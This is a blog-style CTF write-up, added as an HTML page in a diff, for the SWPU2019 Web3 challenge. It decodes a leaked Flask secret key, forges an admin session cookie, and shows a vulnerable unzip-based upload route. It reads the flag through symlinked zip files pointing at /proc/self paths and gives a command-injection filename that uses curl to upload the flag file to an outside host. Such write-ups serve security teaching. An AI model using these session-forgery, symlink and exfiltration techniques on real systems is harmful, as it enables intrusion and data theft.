@@ -1,0 +1,568 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>[SWPU2019]Web3 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="[SWPU2019]Web3">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-04-08 21:08" pubdate>
+        2020年4月8日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      793 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      13
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">[SWPU2019]Web3</h1>
+            
+            <div class="markdown-body">
+              <h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><ol>
+<li><p>随意输入都能登录  查看源码有一处注释可疑</p>
+<pre><code class="hljs xml"><span class="hljs-comment">&lt;!--</span>
+<span class="hljs-comment">404 not found</span>
+<span class="hljs-comment">--&gt;</span></code></pre>
+
+<p>随便输入访问到404页面，放到burp查看相应包</p>
+<p><code>Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg==</code></p>
+<p>base64解密为 SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</p>
+</li>
+<li><p>脚本直接伪造admin</p>
+<pre><code class="hljs csp">python flask_session_cookie_manager3.py decode -c <span class="hljs-string">&#x27;eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoicSIsInVzZXJuYW1lIjoiMTIzIn0.Xo3RYQ.WSpp6_ZvPfQfdlnAX3ZbtSnEOS0&#x27;</span> -s <span class="hljs-string">&#x27;keyqqqwwweee!@#$%^&amp;*&#x27;</span>
+
+&#123;<span class="hljs-string">&#x27;id&#x27;</span>: b<span class="hljs-string">&#x27;100&#x27;</span>, <span class="hljs-string">&#x27;is_login&#x27;</span>: True, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span>&#125;
+
+python flask_session_cookie_manager3.py encode -s <span class="hljs-string">&#x27;keyqqqwwweee!@#$%^&amp;*&#x27;</span> -t &quot;&#123;<span class="hljs-string">&#x27;id&#x27;</span>: b<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;is_login&#x27;</span>: True, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span>&#125;&quot;
+
+eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoicSIsInVzZXJuYW1lIjoiMTIzIn0.Xo3SLw.lL3TAbVjmsDo65DOZhUNjrM8hkc</code></pre>
+</li>
+<li><p>成功到上传界面，源码有注释</p>
+<pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span>():</span>
+    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;id&#x27;</span>] != <span class="hljs-string">b&#x27;1&#x27;</span>:
+        <span class="hljs-keyword">return</span> render_template_string(temp)
+    <span class="hljs-keyword">if</span> request.method==<span class="hljs-string">&#x27;POST&#x27;</span>:
+        m = hashlib.md5()
+        name = session[<span class="hljs-string">&#x27;password&#x27;</span>]
+        name = name+<span class="hljs-string">&#x27;qweqweqwe&#x27;</span>
+        name = name.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)
+        m.update(name)
+        md5_one= m.hexdigest()
+        n = hashlib.md5()
+        ip = request.remote_addr
+        ip = ip.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)
+        n.update(ip)
+        md5_ip = n.hexdigest()
+        f=request.files[<span class="hljs-string">&#x27;file&#x27;</span>]
+        basepath=os.path.dirname(os.path.realpath(__file__))
+        path = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span>+md5_one+<span class="hljs-string">&#x27;/&#x27;</span>+session[<span class="hljs-string">&#x27;username&#x27;</span>]+<span class="hljs-string">&quot;/&quot;</span>
+        path_base = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span>
+        filename = f.filename
+        pathname = path+filename
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;zip&quot;</span> != filename.split(<span class="hljs-string">&#x27;.&#x27;</span>)[-<span class="hljs-number">1</span>]:
+            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;zip only allowed&#x27;</span>
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path_base):
+            <span class="hljs-keyword">try</span>:
+                os.makedirs(path_base)
+            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path):
+            <span class="hljs-keyword">try</span>:
+                os.makedirs(path)
+            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(pathname):
+            <span class="hljs-keyword">try</span>:
+                f.save(pathname)
+            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>
+        <span class="hljs-keyword">try</span>:
+            cmd = <span class="hljs-string">&quot;unzip -n -d &quot;</span>+path+<span class="hljs-string">&quot; &quot;</span>+ pathname
+            <span class="hljs-keyword">if</span> cmd.find(<span class="hljs-string">&#x27;|&#x27;</span>) != -<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> cmd.find(<span class="hljs-string">&#x27;;&#x27;</span>) != -<span class="hljs-number">1</span>:
+				waf()
+                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>
+            os.system(cmd)
+        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>
+        unzip_file = zipfile.ZipFile(pathname,<span class="hljs-string">&#x27;r&#x27;</span>)
+        unzip_filename = unzip_file.namelist()[<span class="hljs-number">0</span>]
+        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;is_login&#x27;</span>] != <span class="hljs-literal">True</span>:
+            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;not login&#x27;</span>
+        <span class="hljs-keyword">try</span>:
+            <span class="hljs-keyword">if</span> unzip_filename.find(<span class="hljs-string">&#x27;/&#x27;</span>) != -<span class="hljs-number">1</span>:
+                shutil.rmtree(path_base)
+                os.mkdir(path_base)
+                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>
+            image = <span class="hljs-built_in">open</span>(path+unzip_filename, <span class="hljs-string">&quot;rb&quot;</span>).read()
+            resp = make_response(image)
+            resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span>
+            <span class="hljs-keyword">return</span> resp
+        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+            shutil.rmtree(path_base)
+            os.mkdir(path_base)
+            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>
+    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)
+
+
+<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/showflag&#x27;</span></span>)</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">showflag</span>():</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> == <span class="hljs-literal">False</span>:
+        image = <span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">&#x27;./flag/flag.jpg&#x27;</span>), <span class="hljs-string">&quot;rb&quot;</span>).read()
+        resp = make_response(image)
+        resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span>
+        <span class="hljs-keyword">return</span> resp
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;can&#x27;t give you&quot;</span></code></pre>
+
+<p>可以看到flag在/flag/flag.jpg</p>
+</li>
+<li><p>软链接读文件，关键在于怎么获取到flag.jpg绝对路径</p>
+<p>在 linux 中，<code>/proc/self/cwd/</code>会指向进程的当前目录，那么在不知道 flask 工作目录时，我们可以用<code>/proc/self/cwd/flag/flag.jpg</code>来访问 flag.jpg</p>
+<pre><code class="hljs awk">ln -s <span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/cwd/</span>flag/flag.jpg qwe
+zip -ry qwe.zip qwe</code></pre>
+
+<p>或者先找到当前目录路径</p>
+<p>在 linux 中，<code>/proc/self/environ</code>文件里包含了进程的环境变量，可以从中获取 flask 应用的绝对路径，再通过绝对路径制作软链接来读取 flag.jpg (PS：在浏览器中，我们无法直接看到<code>/proc/self/environ</code>的内容，只需要下载到本地，用 notepad++打开即可)</p>
+<pre><code class="hljs tcl">ln -s /<span class="hljs-keyword">proc</span>/self/environ<span class="hljs-title"> qqq</span>
+<span class="hljs-title"></span> <span class="hljs-title">  zip</span> -ry<span class="hljs-title"> qqq.zip</span> qqq
+ln -s /ctf/hgfjakshgfuasguiasguiaaui/myflask/flag/flag.jpg<span class="hljs-title"> www</span>
+<span class="hljs-title"></span> <span class="hljs-title">  zip</span> -ry<span class="hljs-title"> www.zip</span> www</code></pre>
+
+<p>也可以命令注入：</p>
+<pre><code class="hljs arcade">$(III=<span class="hljs-string">`awk &#x27;BEGIN&#123;printf \&quot;%c\&quot;, 47&#125;&#x27;`</span>&amp;&amp;curl xxx.xxx.xxx.xxx:<span class="hljs-number">9999</span> -T <span class="hljs-string">`echo <span class="hljs-subst">$&#123;III&#125;</span>ctf<span class="hljs-subst">$&#123;III&#125;</span>hgfjakshgfuasguiasguiaaui<span class="hljs-subst">$&#123;III&#125;</span>myflask<span class="hljs-subst">$&#123;III&#125;</span>flag<span class="hljs-subst">$&#123;III&#125;</span>flag.jpg`</span>).zip</code></pre>
+
+
+
+</li>
+</ol>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/194640">https://www.anquanke.com/post/id/194640</a></p>
+<p><a target="_blank" rel="noopener" href="https://lihuaiqiu.github.io/2019/12/11/SWPU2019-Web%E9%A2%98%E8%A7%A3/">https://lihuaiqiu.github.io/2019/12/11/SWPU2019-Web题解/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/flask-session%E4%BC%AA%E9%80%A0/">flask session伪造</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E8%BD%AF%E9%93%BE%E6%8E%A5-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/">软链接/命令注入</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/04/10/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">二次注入</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/04/08/xxe%E6%80%BB%E7%BB%93%E7%AF%87/">
+                        <span class="hidden-mobile">xxe总结篇</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
